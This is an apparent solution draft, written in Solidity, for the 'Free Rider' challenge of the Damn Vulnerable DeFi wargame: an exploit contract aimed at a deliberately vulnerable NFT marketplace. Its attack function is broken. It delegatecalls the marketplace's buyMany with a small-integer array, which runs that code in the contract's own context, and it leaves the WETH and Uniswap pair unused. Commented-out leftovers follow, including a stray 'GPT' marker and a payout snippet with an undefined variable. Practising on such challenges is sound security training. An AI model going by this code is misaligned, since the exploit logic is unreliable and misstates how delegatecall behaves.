// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableNFT.sol";
import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

// As interface for avoiding pragma mismatch. Also saves gas.
interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint256 value) external returns (bool);

    function withdraw(uint256) external;
}

contract FreeRiderExploit {
    using Address for address;

    DamnValuableNFT public token;
    FreeRiderBuyer public freeride;
    FreeRiderNFTMarketplace public marketplace;

    IWETH private immutable WETH;
    IUniswapV2Pair private immutable UNISWAP_PAIR;

    constructor(address _nft, address _freerider, address payable _market, address _weth, address _pair) {
        token = DamnValuableNFT(_nft);
        freeride = FreeRiderBuyer(_freerider);
        marketplace = FreeRiderNFTMarketplace(_market);
        WETH = IWETH(_weth);
        UNISWAP_PAIR = IUniswapV2Pair(_pair);
    }

    function attack() external {
        (bool success, ) = address(marketplace).delegatecall(abi.encodeWithSignature("buyMany(uint256[])", [0, 1, 2, 3, 4, 5]));
        require(success, "totly fail");
        // bytes memory data = new bytes(0);
        // for (uint i = 0; i < 5; i++) {
        //     freeride.onERC721Received(address(this), address(this), i, data);
        // }

        // == GPT

        // Transfer the payout amount to the seller
        // (bool success, ) = seller.call{value: payoutAmount}("");
        // require(success, "Transfer failed");
    }

    receive() external payable {}
}
